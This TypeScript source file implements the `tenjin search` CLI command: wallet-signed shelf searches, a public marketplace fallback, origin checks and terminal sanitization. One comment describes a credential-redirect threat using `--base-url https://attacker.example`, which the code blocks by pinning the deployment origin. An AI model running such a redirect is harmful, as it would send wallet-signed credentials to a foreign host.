import { CliError } from '../lib/errors';
import { formatUsdDisplay, parseUsdToAtomic } from '../lib/money';
import {
  onConfiguredDeployment,
  resolveContextSettings,
  type ResolvedSettings,
} from '../lib/settings';
import {
  buildSearchRequest,
  postSearch,
  postShelfSearch,
  MAX_LIMIT,
  QUERY_MAX,
  type SearchInput,
  type SearchResult,
} from '../lib/agent-api';
import { resolveWriteAuth } from '../lib/consent';
import { searchHeaders } from '../lib/search-auth';
import { describeWallet, resolveWalletProvider, type WalletProvider } from '../lib/wallet';
import { cut } from '../hooks/text';
import { recordSearch } from '../lib/searches';
import { readActor, type SessionActor } from '../lib/session';
import { assertOnBaseOrigin } from '../lib/resource-ref';
import { originOf } from '../lib/url';
import { sanitizeForTerminal } from '../lib/output';
import type { CommandContext, CommandResult } from '../context';

/**
 * `tenjin search "<question>"`, ONE POST, `view: "decision"`.
 *
 * With a shelf set it goes signed to `/api/shelves/<slug>/search` and comes back
 * with two lists, the shelf's and the marketplace's; `team.publicFallback` is
 * what sets `includePublic`, and the org's own `public_search` policy bounds it.
 * With no shelf set it goes unsigned to `/api/search`, exactly as it always did.
 * Either way it is one request: a question is charged once however many shelves
 * answer it.
 *
 * A LOCAL CREDENTIAL FAILURE ROUTES, IT DOES NOT REFUSE. Nothing able to sign
 * sends the one call unsigned to `/api/search` and prints the reason first, the
 * same rule `hooks/legs/shelf.ts` follows, because the MCP `tenjin_search` tool
 * runs this function with no TTY to mint at. The two loud cases stay loud: a
 * server that rejected a signed call, and a machine that turned the marketplace
 * off and so has nothing to fall back to.
 *
 * Prints the compact result (spec 10) and records the searchId + items locally so
 * `outcome --search-id` and `buy <resourceId>` can use them.
 *
 * The machine envelope is the server's response verbatim plus exactly one
 * CLI-owned key, `publishBack`, and only on a miss. It carries no server data: it
 * is the local searchId and the two commands that close the loop, which is
 * information the CLI owns and the contract does not describe.
 *
 * Search is the breadth step: an item is a lean hit (identity, price, freshness,
 * why it matched), and the full answer card comes from `tenjin inspect`, which is
 * free. So an item line stays short on purpose.
 *
 * A MISS is no longer a `decision` the server sends, it is simply `matched: 0`
 * with an empty `items` (search v3). The CANDIDATES/MISS wording survives ONLY in
 * the local store, whose entries predate v3 and whose `decision` field `outcome`
 * still reads; it is derived here from whether anything matched, and never parsed
 * off the wire.
 *
 * The response's `searchId` is the outcome-reporting capability for
 * POST /api/searches/<searchId>/outcomes. tenjin#463 renamed the field (from
 * `lookupId`), tenjin#616 dropped the `/agent` prefix from the outcomes path, and
 * tenjin#137 retired the `/api/agent/search` alias; this client follows all three
 * end to end, so nothing on the wire or in the local store still speaks
 * `lookupId` or a prefixed spelling.
 */

/** The one remedy for a shelf that could not be signed for; doctor names the rest. */
const DOCTOR_FIX = 'Run `tenjin doctor` to see the wallet and its session.';

export interface SearchArgs {
  question: string;
  /** Decimal USD at the edge (O1); converted to atomic for the wire. */
  maxPrice?: string;
  freshWithin?: string;
  limit?: string;
  /** Raw `k=v` / `k=v1,v2` pairs from repeated --applies-to. */
  appliesTo?: string[];
}

export interface SearchDeps {
  fetchImpl?: typeof fetch;
  /** Environment seam (the harness session and thread ids); defaults to process.env. */
  env?: NodeJS.ProcessEnv;
  /** Test-injection seam for the wallet a shelf search signs through. */
  provider?: WalletProvider;
}

export async function runSearch(
  args: SearchArgs,
  ctx: CommandContext,
  deps: SearchDeps = {},
): Promise<CommandResult> {
  const settings = await resolveContextSettings(ctx);
  // Cut to the shelf's bound at a word boundary, silently, as the daemon's arms
  // do: an agent mid-task that wrote a long question gets its head answered
  // rather than a USAGE refusal and a retry (owner decision 2026-09-12).
  const input: SearchInput = { question: cut(args.question.trim(), QUERY_MAX) };
  if (args.maxPrice !== undefined) input.maxPrice = parseUsdToAtomic(args.maxPrice);
  if (args.freshWithin !== undefined) input.freshWithin = args.freshWithin;
  if (args.limit !== undefined) input.limit = parseLimit(args.limit);
  if (args.appliesTo !== undefined && args.appliesTo.length > 0) {
    input.appliesTo = parseAppliesTo(args.appliesTo);
  }

  const actor = readActor(deps.env ?? process.env);

  const legs: ShelfLeg[] = [];
  // A CREDENTIAL FAILURE NEVER SILENCES A PUBLIC ANSWER (principle 4), and this
  // is the leg rule `hooks/legs/shelf.ts` follows, mirrored here because the
  // same `runSearch` is what the MCP `tenjin_search` tool calls. A non-TTY run
  // cannot mint, so a machine whose session expired would otherwise get exit 3
  // and NO results where the daemon beside it still returns marketplace ones.
  // The reason is printed first, on its own line, so the fallback is never
  // silent; the search itself succeeds.
  //
  // A SERVER REFUSAL IS STILL LOUD. `postShelfSearch` raises on the signed
  // call's 401/404, which is a membership or credential problem the operator
  // has to hear about, and it is not this branch.
  let shelfError: string | undefined;
  // THE PIN COMES BEFORE THE SIGNATURE. `settings.baseUrl` is the RESOLVED base
  // and a flag moves it; the delegation this mints is wallet-signed and gets
  // written over the machine's cached session on the way out, so an agent that
  // runs `tenjin search --base-url https://attacker.example` must not thereby
  // move where the credential goes. Off the configured deployment there is no
  // shelf to search, and the public route still answers unsigned: same shape as
  // the credential fallback below, and the same rule `read` has held since #218.
  const onConfigured = onConfiguredDeployment(originOf(settings.baseUrl), settings);
  if (settings.shelf !== null && !onConfigured) {
    shelfError = `${originOf(settings.baseUrl)} is not the deployment this machine is configured for, so shelf "${settings.shelf}" was not asked`;
  }
  if (settings.shelf !== null && onConfigured) {
    const request = buildSearchRequest({
      ...input,
      includePublic: settings.teamPublicFallback === 'on',
    });
    const url = `${settings.baseUrl.replace(/\/+$/, '')}/api/shelves/${encodeURIComponent(settings.shelf)}/search`;
    const auth = await searchHeaders(
      ctx.dataDir,
      { method: 'POST', url, body: JSON.stringify(request) },
      {
        now: Date.now,
        env: deps.env ?? process.env,
        mint: async () => {
          const provider = resolveWalletProvider(
            ctx,
            deps.provider !== undefined ? { provider: deps.provider } : {},
          );
          // Surfaces WALLET_MISSING with its own fix, and it is what tells
          // `searchHeaders` that "no wallet" is the answer rather than a
          // credential that would not open.
          await describeWallet(provider);
          return resolveWriteAuth({
            signer: await provider.getSigner(),
            baseUrl: settings.baseUrl,
            dataDir: ctx.dataDir,
            scope: 'read',
            env: deps.env ?? process.env,
          });
        },
      },
    );
    if (auth.kind === 'signed') {
      const response = await postShelfSearch(settings.shelf, request, {
        baseUrl: settings.baseUrl,
        timeoutMs: ctx.flags.timeout,
        evalCohort: settings.evalCohort,
        headers: auth.headers,
        ...(deps.fetchImpl !== undefined ? { fetchImpl: deps.fetchImpl } : {}),
      });
      legs.push(await recordLeg('team', response.shelf, request, ctx, settings, actor));
      if (response.public !== null) {
        legs.push(await recordLeg('public', response.public, request, ctx, settings, actor));
      }
    } else if (settings.teamPublicFallback === 'off') {
      // There is no public answer to withhold: this machine asked for the shelf
      // alone, so a credential failure leaves nothing to fall back to and the
      // refusal is the honest answer rather than a search of a list the
      // operator turned off.
      throw new CliError(
        'REFUSED',
        auth.kind === 'no-wallet'
          ? `This machine has no wallet, so the shelf "${settings.shelf}" cannot be searched.`
          : `Could not sign the search of shelf "${settings.shelf}": ${auth.detail}.`,
        {
          fix:
            auth.kind === 'no-wallet'
              ? 'Create one with `tenjin wallet create`, or clear the shelf with `tenjin shelf use --none` to search the public marketplace.'
              : 'Run `tenjin doctor` to see the wallet and its session, or `config set team.publicFallback on` to let a failure fall back to the marketplace.',
        },
      );
    } else {
      shelfError =
        auth.kind === 'no-wallet'
          ? `this machine has no wallet, so shelf "${settings.shelf}" was not asked`
          : `the search of shelf "${settings.shelf}" could not be signed: ${auth.detail}`;
    }
  }
  if (legs.length === 0) {
    const request = buildSearchRequest(input);
    const response = await postSearch(request, {
      baseUrl: settings.baseUrl,
      timeoutMs: ctx.flags.timeout,
      evalCohort: settings.evalCohort,
      ...(deps.fetchImpl !== undefined ? { fetchImpl: deps.fetchImpl } : {}),
    });
    legs.push(await recordLeg('public', response, request, ctx, settings, actor));
  }

  const labelled = settings.shelf !== null;
  const limit = input.limit ?? 5;

  // The envelope is ONE list's response verbatim: the one that answered, or the
  // first (the shelf a publish would go to) when neither did. A merged envelope
  // would be a shape the contract does not describe and `outcome`/`buy` cannot
  // key off, so the second list rides in `shelves` instead.
  const primary = legs.find((leg) => leg.response.items.length > 0) ?? legs[0]!;
  const decision = primary.response.items.length > 0 ? 'CANDIDATES' : 'MISS';

  const humanLines: string[] = [
    // First, whichever way the search then went: a shelf that went unasked is
    // something the operator has to hear about, and the search succeeding on
    // the marketplace is exactly when nothing else would say so.
    ...(shelfError === undefined
      ? []
      : [`The shelf was not searched: ${sanitizeForTerminal(shelfError)}.`, DOCTOR_FIX]),
    ...(decision === 'MISS'
      ? [
          `MISS, no candidates (searchId ${primary.response.searchId})`,
          ...missedShelfLines(legs),
          ...missHint(primary.response),
          ...truncatedHint(primary.response, limit),
          publishBackLine(primary.response.searchId),
        ]
      : legs.flatMap((leg) => shelfLines(leg, labelled, limit))),
  ];

  const data =
    decision === 'MISS'
      ? { ...primary.response, publishBack: publishBackHint(primary.response.searchId) }
      : primary.response;

  return {
    data: labelled
      ? {
          ...(data as object),
          // The machine half of the line above: a caller that never renders
          // humanLines still sees that a shelf it configured went unasked.
          ...(shelfError === undefined ? {} : { shelfError }),
          shelves: legs.map((leg) => ({
            shelf: leg.shelf,
            baseUrl: settings.baseUrl,
            searchId: leg.response.searchId,
            matched: leg.response.items.length,
          })),
        }
      : data,
    humanLines,
  };
}

/** Which list this is, and what it said. */
interface ShelfLeg {
  shelf: 'team' | 'public';
  response: SearchResult;
}

/**
 * Origin-check one returned list and record it locally.
 *
 * Both lists came back from ONE deployment, so the origin checked is the
 * configured base for both: a shelf candidate and a marketplace candidate live
 * on the same host now.
 *
 * Ingest trust boundary: a candidate url that points off the base URL that
 * served it would later route a wallet-signed SIWX header and payment to that
 * host via `buy <resourceId>`. Refuse the whole response as a contract
 * violation. This deliberately diverges from the hook path
 * (`hooks/legs/shelf.ts`), which keeps what it can: a hook hint is advisory and
 * never pays, whereas a `search` result feeds `buy` and must fail closed.
 */
async function recordLeg(
  shelf: 'team' | 'public',
  response: SearchResult,
  request: ReturnType<typeof buildSearchRequest>,
  ctx: CommandContext,
  settings: ResolvedSettings,
  actor: SessionActor | undefined,
): Promise<ShelfLeg> {
  for (const c of response.items) {
    try {
      assertOnBaseOrigin(c.url, settings.baseUrl, 'search candidate URL');
    } catch (err) {
      throw new CliError(
        'CONTRACT_MISMATCH',
        `Search candidate ${c.resourceId} points off the configured base URL.`,
        { cause: err },
      );
    }
  }
  // Derived, never read off the wire: v3 has no `decision` field. The two words
  // are what `outcome` branches on, so they are written here rather than
  // re-derived by every reader from the candidate count.
  const decision = response.items.length > 0 ? 'CANDIDATES' : 'MISS';
  await recordSearch(ctx.dataDir, {
    searchId: response.searchId,
    at: new Date().toISOString(),
    question: request.query,
    decision,
    source: 'cli',
    // ONE ORIGIN, so this is the base URL every close goes back to. The column
    // is kept (it is in `LOOP_SHAPE`) and now holds exactly that.
    shelfBaseUrl: settings.baseUrl,
    // Usually absent; see readActor. An unstamped entry is raised in every
    // session, which is the safe direction for a reminder. The agent is the
    // child this ran inside, so the capture ask names the miss to it alone.
    ...(actor !== undefined ? { sessionId: actor.session } : {}),
    ...(actor?.agent !== undefined ? { agentId: actor.agent } : {}),
    candidates: response.items.map((c) => ({
      resourceId: c.resourceId,
      url: c.url,
      title: c.title,
      price: c.price,
    })),
    // Always zero under search v3, and that is a fact about the result rather
    // than a placeholder: the decision view draws no browse tail at all, so no
    // pointer was offered and none of them cost money.
    paidBrowseCount: 0,
  });
  return { shelf, response };
}

/**
 * One list's candidates. `labelled` follows whether a shelf is SET, not the
 * number of lists that came back: a reader on a shelf needs to know which list
 * answered even when only one did, and a reader with no shelf must see exactly
 * the header this command has always printed.
 */
function shelfLines(leg: ShelfLeg, labelled: boolean, limit: number): string[] {
  const { response } = leg;
  if (response.items.length === 0) return [];
  const head = labelled
    ? `${response.items.length} candidate(s) on the ${leg.shelf} shelf (searchId ${response.searchId}):`
    : `${response.items.length} candidate(s) (searchId ${response.searchId}):`;
  return [
    head,
    // Dollars, not atomic units: this is the human's cue to size the spend
    // against gates they entered in decimal USD (`--max-price 0.10`, the
    // `maxAutoSpend` config). `formatUsdDisplay` is the canonical human-copy
    // form (always two decimals, so a dime reads "0.10" and not "0.1"); the
    // machine `items` array in --json keeps the exact atomic string, per the
    // money-units contract in the README.
    ...response.items.map(
      (c, i) =>
        `  ${i + 1}. ${sanitizeForTerminal(c.title)}, ${formatUsdDisplay(c.price)} USD, ${sanitizeForTerminal(c.url)}`,
    ),
    ...truncatedHint(response, limit),
  ];
}

/** On a total miss with two lists, name both, so the reader knows the public
 *  list was asked rather than assuming the shelf was the only thing looked at. */
function missedShelfLines(legs: ShelfLeg[]): string[] {
  if (legs.length < 2) return [];
  return [`Asked both shelves in one call: ${legs.map((leg) => leg.shelf).join(', then ')}.`];
}

/**
 * A miss under search v3 carries no browse tail at all: the decision view
 * returns matches or nothing, and the catalog is browsed at GET /api/articles.
 * The server says exactly that in `hint`, and rendering the server's own
 * sentence rather than a local paraphrase is what keeps the two from drifting
 * when that pointer moves. It is server-authored text on its way to a terminal,
 * so it is sanitized like every other rendered string, and the parser has
 * already bounded its length.
 *
 * Absent-but-empty is treated as absent: `hint` is contractually present only
 * when nothing matched, so a server that omits it costs the reader one line
 * rather than an empty bullet.
 */
function missHint(response: SearchResult): string[] {
  return response.hint !== undefined && response.hint.length > 0
    ? [sanitizeForTerminal(response.hint)]
    : [];
}

/**
 * `truncated` means the server's size backstop dropped candidates, either a
 * trailing few the limit had room for or a single oversized one. The response
 * ceiling GROWS with the number of candidates returned (tenjin#501), so the
 * remedy is counter-intuitive and worth stating outright: a larger --limit
 * recovers the tail, a smaller one returns strictly fewer. Only at the maximum
 * is the tail unrecoverable and narrowing the question the answer.
 *
 * The CLI knows the limit it sent, so it names the next step instead of
 * restating the rule and leaving the reader to work out which half applies.
 * The flag stays in the machine envelope (--json) untouched, where it is
 * omitted rather than false when it did not fire.
 *
 * Rendering it on a MISS too is DEFENSIVE, not wire behavior: the server only
 * ever sets the flag alongside candidates it dropped. Handling both keeps the
 * flag from going unrendered if that ever changes.
 */
function truncatedHint(response: SearchResult, limit: number): string[] {
  if (response.truncated !== true) return [];
  return [
    limit < MAX_LIMIT
      ? `some candidates were dropped for size; retry with --limit ${MAX_LIMIT} (the size ceiling grows with the number of candidates returned)`
      : `some candidates were dropped for size; at --limit ${MAX_LIMIT} the dropped tail cannot be recovered, so narrow the question`,
  ];
}

/** The publish-back hint, as machine fields rather than prose to re-parse. */
function publishBackHint(searchId: string): {
  searchId: string;
  reason: string;
  publish: string;
  decline: string;
} {
  return {
    searchId,
    reason: 'Nothing on the marketplace answered this. If you solve it, publish it back.',
    // Both arms carry the searchId, because both are commands to run verbatim and
    // a publish without it leaves this very loop open (see publish's --search-id).
    // The second arm is DECLINE, not park: nothing is saved to come back to, and
    // reporting the outcome is what closes the loop so it never raises again.
    publish: `tenjin publish <file.md> --json --search-id ${searchId}`,
    decline: `tenjin outcome --search-id ${searchId} --status regenerated --json`,
  };
}

/** The same hint as one rendered line for a human. */
function publishBackLine(searchId: string): string {
  return `Nobody has published this yet - if you solve it, publish it back (tenjin publish <file.md> --search-id ${searchId}); if you will not, close the loop: tenjin outcome --search-id ${searchId} --status regenerated`;
}

function parseLimit(raw: string): number {
  const n = Number(raw);
  if (!Number.isInteger(n)) {
    throw new CliError('USAGE', `Invalid --limit: ${JSON.stringify(raw)}`, {
      fix: 'Pass an integer between 1 and 10.',
    });
  }
  return n;
}

/** `products=Vercel` or `products=Vercel,Next` → { products: ["Vercel","Next"] }. Repeated
 *  keys merge their values. */
function parseAppliesTo(pairs: string[]): Record<string, string[]> {
  const out: Record<string, string[]> = {};
  for (const pair of pairs) {
    const eq = pair.indexOf('=');
    if (eq <= 0) {
      throw new CliError('USAGE', `Invalid --applies-to: ${JSON.stringify(pair)}`, {
        fix: 'Use key=value, e.g. --applies-to products=Vercel.',
      });
    }
    const key = pair.slice(0, eq).trim();
    const values = pair
      .slice(eq + 1)
      .split(',')
      .map((v) => v.trim())
      .filter((v) => v.length > 0);
    if (values.length === 0) {
      throw new CliError('USAGE', `--applies-to ${JSON.stringify(key)} has no values`, {
        fix: 'Give each key at least one value, e.g. products=Vercel.',
      });
    }
    out[key] = [...(out[key] ?? []), ...values];
  }
  return out;
}
